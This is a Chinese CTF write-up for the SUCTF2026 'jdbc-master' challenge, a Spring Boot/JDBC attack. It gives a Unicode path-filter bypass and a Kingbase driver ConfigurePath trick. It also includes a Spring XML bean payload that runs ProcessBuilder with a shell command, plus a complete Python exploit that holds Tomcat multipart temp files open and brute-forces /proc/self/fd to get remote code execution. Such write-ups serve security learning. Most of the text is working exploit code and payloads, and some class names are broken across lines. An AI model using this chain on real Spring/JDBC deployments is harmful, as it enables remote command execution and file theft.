# SUCTF2026-jdbc-master

## 题目简述
题目是 Spring Boot/JDBC 攻击。附件包含 `app.jar`、PostgreSQL/Kingbase 驱动和 Dockerfile，关键机制在反编译出的控制器、拦截器和 datasource 配置。入口路径含 `suctf` 字符串过滤，可用 Unicode 长 s `ſ` 绕过；后端允许影响 JDBC driver/URL，结合 PostgreSQL JDBC 特性和 Spring XML beans 无外连利用，达到任意文件写入或 bean 加载执行。

## 解题过程
本文学习于：

$$
https://su18.org/post/postgresql-jdbc-attack-and-stuff/#2-postgresql-jdbc-
$$
%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5

$$
https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-
$$
network.html

入口和路径绕过

控制器注解很直接：

```
@Controller
@RequestMapping("/api/connection")
public class ConnectionTestController {
@PostMapping("/suctf")
@ResponseBody
public Map<String, Object> testConnection(@RequestBody String
configurationJson) {
...
}
}
```

拦截器的核心逻辑如下：

```java
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
        throws Exception {
    String servletPath = request.getServletPath();
    if (servletPath.matches("(?i).*s\\W*u\\W*c\\W*t\\W*f.*")
            || servletPath.toLowerCase().contains("suctf")) {
        response.setStatus(403);
        response.getWriter().write("blocked by filter");
        return false;
    }
    return true;
}
```

这里直接用unicode绕过%C5%BF 是长 s ſ 。这条路径可以命中 @PostMapping("/suctf") ，
但不会被上面三条字符串检查当成字面 suctf 拦掉。

默认 driver 可覆盖

Pg 这个 DTO 只是构造时给了默认值：

``` 
public class Pg extends DatasourceConfiguration {
private String driver;
private String extraParams;

public Pg() {
this.driver = "org.postgresql.Driver";
this.extraParams = "";
}

public String getDriver() {
return this.driver;
}

public void setDriver(String driver) {
this.driver = driver;
}
}
```

后端不会把它锁死回 org.postgresql.Driver ，而是直接吃用户传入的值。

真正加载驱动的逻辑在 ConnectionTestService.testConnection() ：

```
public boolean testConnection(String json) {
DatasourceConfiguration conf = (DatasourceConfiguration)
objectMapper.readValue(json, Pg.class);
Properties props = new Properties();

if (conf.getUsername() != null && !conf.getUsername().trim().isEmpty()) {
props.setProperty("user", conf.getUsername());
}
if (conf.getPassword() != null && !conf.getPassword().trim().isEmpty()) {
props.setProperty("password", conf.getPassword());
}

String jdbc = conf.getJdbc();
validateJdbcUrl(jdbc);

String driver = conf.getDriver();
Class<?> clazz = driverClassLoader.loadClass(driver);
Driver d = (Driver) clazz.newInstance();
Connection c = d.connect(jdbc, props);
...
}
```

所以这里直接改：

```
{
"driver": "com.kingbase8.Driver"

}
```

URL 校验和参数黑名单

validateJdbcUrl() 的代码就是这几条：

```
private void validateJdbcUrl(String jdbcUrl) throws
UnsupportedEncodingException {
if (jdbcUrl == null || jdbcUrl.trim().isEmpty()) {
throw new IllegalArgumentException("jdbcUrl is empty");
}

if (jdbcUrl.trim().toLowerCase().contains(":/")
|| jdbcUrl.trim().toLowerCase().contains("/?")) {
throw new IllegalArgumentException("Cannot contain special
characters");
}

String lower = jdbcUrl.toLowerCase();
for (String p : ILLEGAL_PARAMETERS) {
if (lower.contains(p.toLowerCase())) {
throw new IllegalArgumentException("Illegal parameter:" + p);
}
}
}
```

黑名单常量：

```
static {
ILLEGAL_PARAMETERS = Arrays.asList(
"socketFactory",
"socketFactoryArg",
"sslfactory",
"sslhostnameverifier",
"sslpasswordcallback",
"authenticationPluginClassName",
"loggerFile",
"loggerLevel"
);
}
```

这里有两个关键点：

1. 它只拦首层 URL。

2. 它只是在字符串里找 :/ 和 /? 。

所以 query-only URL 可以直接过：

$$
jdbc:kingbase8:?ConfigurePath=...
$$

这条 URL 没有 :/ 和 /? ，也没有首层的危险参数名。

Kingbase

首先Kingbase是国产基于postgresql研发的一个引擎com.kingbase8.Driver.connect() 里
有一段非常关键：

```
public Connection connect(String url, Properties info) throws SQLException {
...
props = parseURL(url, props);
if (props == null) {
return null;
}

if (KBProperty.CONFIGUREPATH.get(props) != null) {
props = initJDBCCONF(props);
}

setupLoggerFromProperties(props);
return makeConnection(url, props);
}
```

initJDBCCONF() 直接调用：

```
public static Properties initJDBCCONF(Properties props) throws Exception {
return loadPropertyFiles(KBProperty.CONFIGUREPATH.get(props), props);
}
```

```
public static Properties loadPropertyFiles(String fileName, Properties props)
throws IOException {
Properties newProps = new Properties(props);
File file = getFile(fileName);

if (!file.exists()) {
throw new IOException("Configuration file " + file.getAbsolutePath() +
" does not exist...");
}
newProps.load(new FileInputStream(file));
return newProps;
}
```

也就是说，只要：

ConfigurePath=/某个可读文件

这份文件里的内容就会在驱动内部被重新 merge 进 Properties 。这一步已经不受应用层黑名单控
制了。

Spring 接入

SocketFactoryFactory.getSocketFactory() ：

```
public static SocketFactory getSocketFactory(Properties props) throws
KSQLException {
String socketFactoryClassName = KBProperty.SOCKET_FACTORY.get(props);
if (socketFactoryClassName == null) {
return SocketFactory.getDefault();
}

try {
return (SocketFactory) ObjectFactory.instantiate(
socketFactoryClassName,
props,
true,
KBProperty.SOCKET_FACTORY_ARG.get(props)
);
} catch (Exception ex) {
throw new KSQLException(
"The SocketFactory class provided {0} could not be instantiated.",
KSQLState.CONNECTION_FAILURE,
ex
);
}
}

ObjectFactory.instantiate() ：

public static Object instantiate(String className, Properties info, boolean
tryString, String arg)
throws ClassNotFoundException, NoSuchMethodException,
InstantiationException,
IllegalAccessException, InvocationTargetException {
Object[] ctorArgs = new Object[] { info };
Constructor ctor = null;
Class<?> cls = Class.forName(className);

try {
ctor = cls.getConstructor(Properties.class);
} catch (NoSuchMethodException e) {
if (tryString) {
try {
ctor = cls.getConstructor(String.class);
ctorArgs = new String[] { arg };
} catch (NoSuchMethodException e2) {
tryString = false;
}
}
if (!tryString) {
ctor = cls.getConstructor((Class[]) null);
ctorArgs = null;
}
}

return ctor.newInstance(ctorArgs);
}
```

这就是链子的核心：

1. socketFactory 能指定任意类

2. 优先尝试 (Properties) 构造

3. 没有就尝试 (String) 构造

4. 再没有才走无参构造

5. 实例化完成之后才 cast 成 SocketFactory

所以二阶段配置里只要写：

```
socketFactory=org.springframework.context.support.FileSystemXmlApplicationConte
```

xt

```
socketFactoryArg=file:/.../payload.xml
```

就会先执行：

$$
new FileSystemXmlApplicationContext("file:/.../payload.xml")
$$

然后才在外层因为不能 cast 成 SocketFactory 报错。

报错不重要，副作用已经发生了。

最关键的一部分：两个临时文件

这里直接说结论：因为一份文件必须给 ConfigurePath 当 properties 读，另一份文件必须给
Spring 当 XML 读。

这两种格式不能混。

具体是：

第一份文件：

```text
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="
http://www.springframework.org/schema/beans
https://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
<constructor-arg>
<list>
<value>sh</value>
<value>-c</value>
<value>for d in /tmp/tomcat-docbase.8080.*; do cat /flag >
"$d"/flag.txt; done</value>
</list>
</constructor-arg>
</bean>
</beans>
```

```
loggerLevel=DEBUG
loggerFile=/proc/self/fd/1
socketFactory=org.springframework.context.support.FileSystemXmlApplicationConte
```

xt

```
socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*00000000.tmp
```

这两份东西如果硬塞进一个文件里，ConfigurePath 读不通，Spring 也读不通。

所以从结构上就决定了必须要两份内容载体。

为什么 XML 不能继续用 fd

一开始很自然会想到：

$$
socketFactoryArg=file:/proc/self/fd/xx
$$

但这样会有两个问题：

1. 外层 ConfigurePath=/proc/self/fd/<n> 已经要爆一次 fd

2. 内层 XML 再写 /proc/self/fd/<m> ，就变成同一次利用里同时命中两组不稳定 fd

所以最后必须把 XML 这一层从 fd 爆破换成路径通配符。

真正能用的是：

$$
socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*0000000
$$
0.tmp

注意这里不能写成：

$$
socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*.tmp
$$

因为 *.tmp 会把目录里所有上传 tmp 都交给 Spring 当 XML 解析。到时 properties 那份 tmp 也会
被一起当 XML 读，直接报错。

所以这里必须收窄到只命中 XML 那份文件。我的做法是：

1. 先挂 XML

2. 再挂 properties

这样 fresh 环境里：

是 XML• 00000000.tmp

是 properties• 00000001.tmp

于是 *00000000.tmp 才是安全的。

Tomcat 临时文件和 fd利用

利用依赖 Tomcat multipart 临时文件。

发大体积 multipart 请求，并故意不发完，Tomcat 会先落盘：

```
/tmp/tomcat.8080.<随机数>/work/Tomcat/localhost/ROOT/upload_<uuid>_00000000.tmp
/tmp/tomcat.8080.<随机数>/work/Tomcat/localhost/ROOT/upload_<uuid>_00000001.tmp
```

同时 Java 进程里会出现对应 fd，比如本地实测：

```
/proc/8/fd/29 -> ...00000000.tmp
/proc/8/fd/31 -> ...00000001.tmp
```

最后只需要爆 properties 那个 fd 即可。

docBase回显

直接写 Tomcat docBase：

/tmp/tomcat-docbase.8080.<随机数>/

因为这个目录里的文件可以直接 HTTP 访问。实测在这里写：

/tmp/tomcat-docbase.8080.<随机数>/flag.txt

之后直接：

GET /flag.txt ，就能把内容读回来，这比 socket 回写稳很多。

### exp

```python
import argparse
import json
import socket
import sys
import threading
import time
from pathlib import Path

REQUEST_PATH = "/api/connection/%C5%BFuctf;foo=1"
XML_MATCH = "*00000000.tmp"

class UploadHolder:
def __init__(self, host: str, port: int, filename: str, content_type: str,
body: bytes):
self.host = host
self.port = port
self.filename = filename
self.content_type = content_type
self.body = body
self.sock = None
self.thread = threading.Thread(target=self._run, daemon=True)

def start(self) -> None:
self.thread.start()

def _run(self) -> None:
try:
sock = socket.create_connection((self.host, self.port),
timeout=3.0)
self.sock = sock
headers = (
f"POST {REQUEST_PATH} HTTP/1.1\r\n"
f"Host: {self.host}:{self.port}\r\n"
"Content-Type: multipart/form-data; boundary=foo\r\n"
"Content-Length: 1000000\r\n"
"Connection: keep-alive\r\n"
"\r\n"
"--foo\r\n"
f'Content-Disposition: form-data; name="a"; filename="
{self.filename}"\r\n'
f"Content-Type: {self.content_type}\r\n"
"\r\n"
).encode("ascii")
sock.sendall(headers)
sock.sendall(self.body)
sock.sendall(b" " * 131072)
time.sleep(90)
except OSError:
pass
finally:
if self.sock is not None:
try:
self.sock.close()
except OSError:
pass

def stop(self) -> None:
if self.sock is not None:
try:
self.sock.close()
except OSError:
pass

def recv_all(sock: socket.socket, timeout: float) -> bytes:
sock.settimeout(timeout)
chunks = []
while True:
try:
data = sock.recv(4096)
except socket.timeout:

break
if not data:
break
chunks.append(data)
return b"".join(chunks)

def raw_http(
host: str,
port: int,
method: str,
path: str,
headers: dict[str, str],
body: bytes = b"",
timeout: float = 2.0,
) -> bytes:
sock = socket.create_connection((host, port), timeout=timeout)
try:
request = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}"]
for key, value in headers.items():
request.append(f"{key}: {value}")
request.append("")
request.append("")
sock.sendall("\r\n".join(request).encode("ascii") + body)
return recv_all(sock, timeout)
finally:
try:
sock.close()
except OSError:
pass

def trigger_fd(host: str, port: int, fd: int) -> None:
body = json.dumps(
{
"urlType": "jdbcUrl",
"jdbcUrl": f"jdbc:kingbase8:?ConfigurePath=/proc/self/fd/{fd}",
"username": "a",
"password": "b",
"driver": "com.kingbase8.Driver",
},
separators=(",", ":"),
).encode("utf-8")
try:
raw_http(
host,
port,

"POST",
REQUEST_PATH,
{
"Content-Type": "application/json",
"Content-Length": str(len(body)),
"Connection": "close",
},
body,
timeout=2.0,
)
except OSError:
pass

def fetch_flag(host: str, port: int) -> str:
try:
response = raw_http(
host,
port,
"GET",
"/flag.txt",
{"Connection": "close"},
timeout=2.0,
)
except OSError:
return ""
if b"\r\n\r\n" not in response:
return ""
return response.split(b"\r\n\r\n", 1)[1].decode("utf-8", "ignore").strip()

def exploit_port(host: str, port: int, xml_payload: bytes) -> str:
props = (
"loggerLevel=DEBUG\n"
"loggerFile=/proc/self/fd/1\n"

"socketFactory=org.springframework.context.support.FileSystemXmlApplicationCont
```

ext\n"

```python
f"socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/{XML_MATCH}\n"
).encode("utf-8")

holders = [
UploadHolder(host, port, "x.xml", "text/xml", xml_payload),
UploadHolder(host, port, "x.properties", "text/plain", props),
]
try:

holders[0].start()
time.sleep(1.0)
holders[1].start()
time.sleep(1.0)

for fd in range(24, 41):
trigger_fd(host, port, fd)
flag = fetch_flag(host, port)
if "suctf{" in flag:
return flag
return ""
finally:
for holder in holders:
holder.stop()

def main() -> int:
parser = argparse.ArgumentParser()
parser.add_argument("host", nargs="?", default="<target>")
parser.add_argument("ports", nargs="*", type=int, default=[10018, 10019,
10020])
args = parser.parse_args()

xml_path = Path(__file__).with_name("kingbase_docbase_flag.xml")
if not xml_path.exists():
print(f"missing xml payload: {xml_path}", file=sys.stderr)
return 1
xml_payload = xml_path.read_bytes()

for port in args.ports:
print(f"[*] trying {args.host}:{port}", file=sys.stderr, flush=True)
flag = exploit_port(args.host, port, xml_payload)
if flag:
print(flag)
return 0

print("flag not found", file=sys.stderr)
return 1

if __name__ == "__main__":
raise SystemExit(main())
```

## 方法总结
- 核心技巧：JDBC URL/driver 攻击 + Spring 解析链
- 识别信号：可控 JDBC 参数、存在 PostgreSQL/Kingbase 驱动、路径过滤有 Unicode 差异。
- 复用要点：先绕过路由过滤进入接口，再利用 JDBC 驱动特性写文件或触发 Spring XML bean。
